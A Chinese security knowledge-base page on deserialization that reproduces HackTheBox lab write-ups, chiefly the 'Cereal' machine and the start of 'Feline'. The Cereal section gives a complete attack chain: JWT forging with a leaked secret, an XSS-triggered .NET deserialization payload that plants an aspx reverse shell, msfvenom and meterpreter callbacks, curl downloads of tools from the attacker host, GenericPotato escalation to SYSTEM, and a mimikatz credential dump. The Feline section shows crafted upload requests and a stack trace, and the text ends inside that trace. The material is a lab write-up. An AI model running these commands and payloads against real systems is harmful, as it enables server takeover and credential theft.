---
title: 反序列化、对象生命周期与加载器
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/serialization/
categories:
- Web安全
- 反序列化
tags:
- 知识库
- 反序列化
- Java
- PHP
- XSS
- GraphQL
- SeImpersonate
- SaltStack
- Docker
- Ruby
- 2FA
- JNDI
- Log4Shell
description: 不同语言的对象恢复机制会调用不同的加载、构造、析构或访问方法。本章保留 Java、PHP、Ruby 和 .NET 的原始对象与 gadget，按入口、可控数据和实际调用来核查。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

不同语言的对象恢复机制会调用不同的加载、构造、析构或访问方法。本章保留 Java、PHP、Ruby 和 .NET 的原始对象与 gadget，按入口、可控数据和实际调用来核查。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/serialization/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Feline、Logforge、Time 和 Ophiuchi 分别依赖会话文件、JNDI、类型绑定和 YAML 加载。

Tenet 与 PHP 题组保留对象状态和触发顺序；Jewel 保留 Ruby 相关数据。

Cereal 与 Sharp 连接浏览器或远程服务接口，原有链中的可达性与权限信息一起保留。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [XSS 驱动的对象反序列化](#case-cereal) | cereal | 反序列化、XSS、GraphQL、SeImpersonate |
| [Tomcat 会话文件与 Salt 管理面](#case-feline) | feline | Java、反序列化、SaltStack、Docker |
| [Ruby 对象状态与账户迁移](#case-jewel) | jewel | Ruby、反序列化、2FA |
| [Logforge 中的 JNDI 与 classpath](#case-log4j) | log4j | Java、JNDI、Log4Shell、CVE-2021-44228 |
| [YAML 加载与 WASM 返回值](#case-ophiuchi) | Ophiuchi | YAML、Java、WASM、Go |
| [应用配置、.NET Remoting 与 WCF](#case-sharp) | sharp | .NET、反序列化、WCF、逆向 |
| [PHP 对象析构与密钥写入竞态](#case-tenet) | tenet | PHP、反序列化、竞态条件 |
| [Jackson 类型绑定与可写任务](#case-time) | time | Jackson、反序列化、CVE-2019-12384 |
| [PHP 魔术方法与对象状态](#case-unserialize) | unserialize | PHP、反序列化、POP链 |

<a id="case-cereal"></a>

## XSS 驱动的对象反序列化

Git 源码暴露 DownloadManager 对象处理，浏览器侧 XSS 为服务器请求提供可达路径；GraphQL SSRF 与 GenericPotato 的原有组合单独留档。

<p class="kb-provenance">来源 cereal · 原记录 2021-01-15 · 24 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-cereal">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start cereal -->

#### introduce

OS: Windows
Difficulty: Hard
Points:	40
Release:	21 Nov 2020
IP:	10.10.10.217

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb158.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
┌──(root💀kali)-[~/hackthebox/machine/cereal]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.217
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_7.7 (protocol 2.0)
80/tcp  open  http     Microsoft IIS httpd 10.0
443/tcp open  ssl/http Microsoft IIS httpd 10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

vhosts from https certificate (add to /etc/hosts): 

``` bash
cereal.htb source.cereal.htb
```

extract exposed git directory in source.cereal.htb/.git:

``` bash
git clone https://github.com/internetwache/GitTools.git
```

``` bash
┌──(root💀kali)-[~/GitTools-master/Dumper]
└─# ip=http://source.cereal.htb/.git/
┌──(root💀kali)-[~/GitTools-master/Dumper]
└─# mkdir /tmp/git
┌──(root💀kali)-[~/GitTools-master/Dumper]
└─# mkdir /tmp/src
┌──(root💀kali)-[~/GitTools-master/Dumper]
└─# ./gitdumper.sh $ip /tmp/git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating /tmp/git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/34/b68232714f841a274050591ff5595dcf7f85da
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5
[+] Downloaded: objects/7b/d9533a2e01ec11dfa928bd491fe516477ed291
[+] Downloaded: objects/3a/23ffe921530036a4e0c355e6c8d1d4029cb728
...
┌──(root💀kali)-[~/GitTools-master/Extractor]
└─# ./extractor.sh /tmp/git /tmp/src
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[+] Found commit: 3a23ffe921530036a4e0c355e6c8d1d4029cb728
[+] Found file: /tmp/src/0-3a23ffe921530036a4e0c355e6c8d1d4029cb728/.gitignore
[+] Found file: /tmp/src/0-3a23ffe921530036a4e0c355e6c8d1d4029cb728/ApplicationOptions.cs
[+] Found file: /tmp/src/0-3a23ffe921530036a4e0c355e6c8d1d4029cb728/Cereal.csproj
[+] Found file: /tmp/src/0-3a23ffe921530036a4e0c355e6c8d1d4029cb728/CerealContext.cs
[+] Found folder: /tmp/src/0-3a23ffe921530036a4e0c355e6c8d1d4029cb728/ClientApp
[+] Found file: /tmp/src/0-3a23ffe921530036a4e0c355e6c8d1d4029cb728/ClientApp/.gitignore
[+] Found file: /tmp/src/0-3a23ffe921530036a4e0c355e6c8d1d4029cb728/ClientApp/README.md
[+] Found file: /tmp/src/0-3a23ffe921530036a4e0c355e6c8d1d4029cb728/ClientApp/package-lock.json
[+] Found file: /tmp/src/0-3a23ffe921530036a4e0c355e6c8d1d4029cb728/ClientApp/package.json
[+] Found folder: /tmp/src/0-3a23ffe921530036a4e0c355e6c8d1d4029cb728/ClientApp/public
...
┌──(root💀kali)-[~/hackthebox/machine/cereal]
└─# mv /tmp/src ./src
┌──(root💀kali)-[~/hackthebox/machine/cereal]
└─# ls
src
┌──(root💀kali)-[~/hackthebox/machine/cereal]
└─# tree
.
└── src
    ├── 0-3a23ffe921530036a4e0c355e6c8d1d4029cb728
    │   ├── ApplicationOptions.cs
    │   ├── appsettings.Development.json
    │   ├── appsettings.json
    │   ├── CerealContext.cs
    │   ├── Cereal.csproj
    │   ├── ClientApp
    │   │   ├── package.json
    │   │   ├── package-lock.json
    │   │   ├── public
    │   │   │   ├── favicon.ico
    │   │   │   ├── FuturaStd-Bold.woff
...
```

exposed secret in the file "2-8f2a1a88f15b9109e1f63e4e4551727bfb38eee5/Services/UserService.cs":

``` bash
secretlhfIH&FY*#oysuflkhskjfhefesf
```

vulnerability in the file "Controllers\RequestsController.cs":
deserialization (can't use ysoserial because of custom protection, but can use deserialization of the DownloadManager object -> upload aspx shell)

vulnerability in the file "ClientApp\src\AdminPage\AdminPage.jsx":

xss (https://snyk.io/vuln/npm:react-marked-markdown:20180517)
-> with this xss we can do server-side requests and trigger the deserialization

create jwt_token with exposed secret:

``` bash
git clone https://github.com/ticarpi/jwt_tool
```

``` bash
┌──(root💀kali)-[~/jwt_tool-master]
└─# python3 jwt_tool.py -S hs256 -p 'secretlhfIH&FY*#oysuflkhskjfhefesf' $(echo -n '{"alg":"HS256","typ":"JWT"}' | base64).$(echo -n '{"name": "1", "exp":' `date -d "+7 days" +%s`} | base64 -w0).

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.1.0                \______|             @ticarpi      

Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] name = "1"
[+] exp = 1611309858    ==> TIMESTAMP = 2021-01-22 05:04:18 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------

jwttool_8f513bf6c46dcbab36a08eb47d9dd4c0 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMSIsImV4cCI6MTYxMTMwOTg1OH0.JmUBfIp6MwKWxKDXAPhFEvqHa60qqlYOBWnrKSedMcE
```

How to create the serialized object in csharp:

``` bash
Cereal.DownloadHelper dh = new Cereal.DownloadHelper
{
	URL = "https://someurl/pic.png",
	FilePath = "pic.png",
};

string json = JsonConvert.SerializeObject(dh, new JsonSerializerSettings
{
	TypeNameHandling = TypeNameHandling.All
});
Console.WriteLine(json);
```

crafted payload looks like this:

``` bash
{"$type":"Cereal.DownloadHelper, Cereal","URL":"http://<ip>/shell.aspx","FilePath":"c:/inetpub/source/uploads/shell.aspx"}
```

serve aspx rev-shell (edit shell.aspx host and port, i use port 9001):

``` bash
wget https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
mousepad shell.aspx
python -m SimpleHTTPServer 80
```

script to upload shell.aspx (change my_ip and jwt_token):

 - upload.py

``` bash
import requests
from urllib3.exceptions import InsecureRequestWarning
import base64

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


jwt_token = '<token>'
my_ip = '<ip>'

URL = 'https://cereal.htb/requests'


js_payload = """var jwt_token = '"""+jwt_token+ """';
targeturl = 'https://cereal.htb/requests';

req = new XMLHttpRequest;
var payload = JSON.stringify({"json": '{"$type":"Cereal.DownloadHelper, Cereal","URL":"http://""" +my_ip+"""/shell.aspx","FilePath":"C:/inetpub/source/uploads/shell.aspx"}'});

req.onreadystatechange = function() {
    if (req.readyState == 4) {
        var id = JSON.parse(this.responseText).id;
        //console.log(id)

        req2 = new XMLHttpRequest;
        req2.open('GET', targeturl + "/" + id, false);
        req2.setRequestHeader("Authorization", "Bearer " + jwt_token);
        req2.send();
    }
}
req.open('POST', targeturl, false);
req.setRequestHeader("Authorization", "Bearer " + jwt_token);
req.setRequestHeader('Content-type', 'application/json');
req.send(payload);"""


js_payload_b64 = base64.b64encode(js_payload.encode('utf-8'))
payload = {'json': '{"title":"[XSS](javascript: eval(atob(%22' + js_payload_b64.decode('utf-8') + '%22%29%29)", "flavor":"x", "color":"#FFF", "description":"x"}'}
headers = {'Authorization': 'Bearer ' + jwt_token}


print("shending payload: " + str(payload))
r = requests.post(URL, headers=headers, json=payload, verify=False)
print(r.text)
```

wait a bit until file is uploaded (1 minute max),
start nc listener (with aspx shell port):

``` bash
nc -lvp 9001
```

trigger reverse shell:

``` bash
curl -k https://source.cereal.htb/uploads/shell.aspx
```

enumerate listening ports:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/cereal]
└─# nc -lvp 9001
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.217.
Ncat: Connection from 10.10.10.217:49973.
Spawn Shell...
Microsoft Windows [Version 10.0.17763.1577]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
cereal\sonny
c:\windows\system32\inetsrv>netstat -aon | findstr /i "listening"
netstat -aon | findstr /i "listening"
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       1668
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       852
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8172           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       468
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       308
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1076
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       600
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       620
  TCP    10.10.10.217:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:49668        0.0.0.0:0              LISTENING       3404
  TCP    127.0.0.1:49672        0.0.0.0:0              LISTENING       3704
  TCP    [::]:22                [::]:0                 LISTENING       1668
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       852
  TCP    [::]:443               [::]:0                 LISTENING       4                                                                              
  TCP    [::]:445               [::]:0                 LISTENING       4                                                                              
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       4
  TCP    [::]:8172              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       468
  TCP    [::]:49665             [::]:0                 LISTENING       308
  TCP    [::]:49666             [::]:0                 LISTENING       1076
  TCP    [::]:49667             [::]:0                 LISTENING       600
  TCP    [::]:49670             [::]:0                 LISTENING       620
  TCP    [::1]:49668            [::]:0                 LISTENING       3404
```

-> 8080 interesting

get the user flag

``` bash
c:\Users\sonny\Desktop>type user.txt
type user.txt
0ed97bdf062900a2eb5b18deb96bfa98
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb159.jpg)

enumerate privs:

``` bash
c:\Users\sonny\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

User Name    SID                                           
============ ==============================================
cereal\sonny S-1-5-21-1433318354-2681105707-1558593885-1000


GROUP INFORMATION
-----------------

Group Name                           Type             SID                                                             Attributes                                        
==================================== ================ =============================================================== ==================================================
Everyone                             Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113                                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568                                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\source.cereal.htb        Well-known group S-1-5-82-1091461672-2110406625-1707532520-1965434010-2231625233 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

-> SeImpersonatePrivilege enabled

create exe for metasploit:

``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=9003 -b "\x00\x0a" -a x86 --platform windows -f exe -o m.exe
```

run metasploit:

``` bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.6
set LPORT 9003
run
```

download m.exe to target and execute it:

``` bash
mkdir C:\temp
cd C:\temp
curl http://10.10.14.6/m.exe -o C:\temp\m.exe
.\m.exe
```

create tunnel in meterpreter:

``` bash
# portfwd single ports
portfwd add -l 8081 -p 8080 -r 127.0.0.1
```

analyze the local port 8080 (on our host on 8081),
you find, that it uses graphql,
after enumerating graphql, you find a callable function, which allows ssrf (updatePlant).
combine this ssrf with SeImpersonatePrivilege -> juicy potato with http -> https://github.com/micahvandeusen/GenericPotato

execute GenericPotato.exe on target:

``` bash
curl http://10.10.14.6/nc64.exe -o C:\temp\nc64.exe
curl http://10.10.14.6/GenericPotato.exe -o C:\temp\GenericPotato.exe
curl http://10.10.14.6/NtApiDotNet.xml -o C:\temp\NtApiDotNet.xml
.\GenericPotato.exe -p "C:\temp\nc64.exe" -a "10.10.14.6 9005 -e powershell" -e HTTP -l 8889
```

call the function with curl on kali:

``` bash
curl -k -X "POST" -H "Content-Type: application/json" --data-binary '{"query":"mutation{updatePlant(plantId:2, version:2.2, sourceURL:\"http://localhost:8889\")}"}' 'http://localhost:8081/api/graphql'
```

and we got system privileged reverse shell and got the flag:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/cereal]
└─# nc -lvp 9005
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9005
Ncat: Listening on 0.0.0.0:9005
Ncat: Connection from 10.10.10.217.
Ncat: Connection from 10.10.10.217:50126.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> cd \users\administrator\desktop
cd \users\administrator\desktop
PS C:\users\administrator\desktop> dir
dir


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        1/15/2021  12:17 AM             34 root.txt                                                              


PS C:\users\administrator\desktop> cat root.txt
cat root.txt
2ef4dd4807656f580a6e513cb43957e0
```

use mimikatz get ntlm hash

``` bash
PS C:\users\administrator\desktop> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 546250 (00000000:000855ca)
Session           : Batch from 0
User Name         : sonny
Domain            : CEREAL
Logon Server      : CEREAL
Logon Time        : 1/15/2021 12:44:49 AM
SID               : S-1-5-21-1433318354-2681105707-1558593885-1000
        msv :
         [00000003] Primary
         * Username : sonny
         * Domain   : CEREAL
         * NTLM     : 9806947d86b058dfca0dde0433579cab
         * SHA1     : 519524c36daac6f62dbb631fac66ed1cedf3ab01
        tspkg :
        wdigest :
         * Username : sonny
         * Domain   : CEREAL
         * Password : (null)
        kerberos :
         * Username : sonny
         * Domain   : CEREAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CEREAL$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 1/15/2021 12:17:28 AM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : CEREAL$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : cereal$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 44904 (00000000:0000af68)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/15/2021 12:17:28 AM
SID               : 
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 196095 (00000000:0002fdff)
Session           : Service from 0
User Name         : cereal.htb
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 1/15/2021 12:17:44 AM
SID               : S-1-5-82-3871417701-2112554078-3336495516-2512288484-1474308953
        msv :
        tspkg :
        wdigest :
         * Username : CEREAL$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/15/2021 12:17:29 AM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 89034 (00000000:00015bca)
Session           : Batch from 0
User Name         : sonny
Domain            : CEREAL
Logon Server      : CEREAL
Logon Time        : 1/15/2021 12:17:29 AM
SID               : S-1-5-21-1433318354-2681105707-1558593885-1000
        msv :
         [00000003] Primary
         * Username : sonny
         * Domain   : CEREAL
         * NTLM     : 9806947d86b058dfca0dde0433579cab
         * SHA1     : 519524c36daac6f62dbb631fac66ed1cedf3ab01
        tspkg :
        wdigest :
         * Username : sonny
         * Domain   : CEREAL
         * Password : (null)
        kerberos :
         * Username : sonny
         * Domain   : CEREAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/15/2021 12:17:28 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 46077 (00000000:0000b3fd)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/15/2021 12:17:28 AM
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : CEREAL$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 46049 (00000000:0000b3e1)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/15/2021 12:17:28 AM
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : CEREAL$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CEREAL$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 1/15/2021 12:17:28 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : CEREAL$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : cereal$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb160.jpg)


#### Summary of knowledge

 - use gittool to get the source code
 - DownloadManager object deserialization
 - use xss do server-side requests and trigger the deserialization to download webshell
 - port forwarding by using portfwd
 - combine graphql ssrf with SeImpersonatePrivilege -> juicy potato with http by using GenericPotato to privilege escalation

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end cereal -->

</details>

<a id="case-feline"></a>

## Tomcat 会话文件与 Salt 管理面

上传文件与 JSESSIONID 关联 Tomcat 反序列化，原链随后经 Salt ClearFuncs 与 Docker socket 跨越容器权限边界。运行依赖和转发方式均有记录。

<p class="kb-provenance">来源 feline · 原记录 2020-09-03 · 22 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-feline">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start feline -->

#### introduce

OS: Linux
Difficulty: Hard
Points:	40
Release:	29 Aug 2020
IP:	10.10.10.205

User Blood	szymex73	00 days, 00 hours, 44 mins, 52 seconds.
Root Blood	InfoSecJack	00 days, 02 hours, 08 mins, 18 seconds.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb84.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
root@kali:~# nmap -sV -p- -v --min-rate=10000 10.10.10.205
PORT     STATE SERVICE VERSION                                                                                      
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                                          
8080/tcp open  http    Apache Tomcat 9.0.27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Web Enumeration

The main page returns a title as "VirusBucket" which is used to analyze malicious files just like "VirusTotal".

Some random descriptions are given. From the top menu, we can see some menus available. Out of these, 'service' is where we can upload our file to analyze it.

make a test to uploaded a file and intercepted the request with Burp Suite.

request:

``` bash
POST /upload.jsp?email=12312312@qq.com HTTP/1.1

Host: 10.10.10.205:8080

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: */*

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Referer: http://10.10.10.205:8080/service/

Content-Type: multipart/form-data; boundary=---------------------------136589399510028257051484957281

Origin: http://10.10.10.205:8080

Content-Length: 235

Connection: close

Cookie: JSESSIONID=C41EC8CF6D55F9C72BB143787C0B1D27



-----------------------------136589399510028257051484957281

Content-Disposition: form-data; name="image"; filename="out"

Content-Type: application/octet-stream



test


-----------------------------136589399510028257051484957281--
```

response:

``` bash
HTTP/1.1 200 

Content-Type: text/html;charset=UTF-8

Content-Length: 41

Date: Thu, 03 Sep 2020 09:57:29 GMT

Connection: close




File uploaded successfully!
```

the file is actually uploaded to the server,and then i got the location of uploading files when I change the filename as empty

request:

``` bash
POST /upload.jsp?email=12312312@qq.com HTTP/1.1

Host: 10.10.10.205:8080

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: */*

Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Referer: http://10.10.10.205:8080/service/

Content-Type: multipart/form-data; boundary=---------------------------136589399510028257051484957281

Origin: http://10.10.10.205:8080

Content-Length: 232

Connection: close

Cookie: JSESSIONID=C41EC8CF6D55F9C72BB143787C0B1D27



-----------------------------136589399510028257051484957281

Content-Disposition: form-data; name="image"; filename=""

Content-Type: application/octet-stream



test


-----------------------------136589399510028257051484957281--
```

response:

``` bash
HTTP/1.1 200 

Content-Type: text/html;charset=UTF-8

Content-Length: 2867

Date: Thu, 03 Sep 2020 10:02:59 GMT

Connection: close








<div id="error">
java.io.FileNotFoundException: /opt/samples/uploads (Is a directory)
	at java.base/java.io.FileOutputStream.open0(Native Method)
	at java.base/java.io.FileOutputStream.open(FileOutputStream.java:298)
	at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:237)
	at java.base/java.io.FileOutputStream.<init>(FileOutputStream.java:187)
	at org.apache.commons.fileupload.disk.DiskFileItem.write(DiskFileItem.java:394)
	at org.apache.jsp.upload_jsp._jspService(upload_jsp.java:205)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:741)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:476)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:385)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:329)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:741)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:526)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:678)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:861)
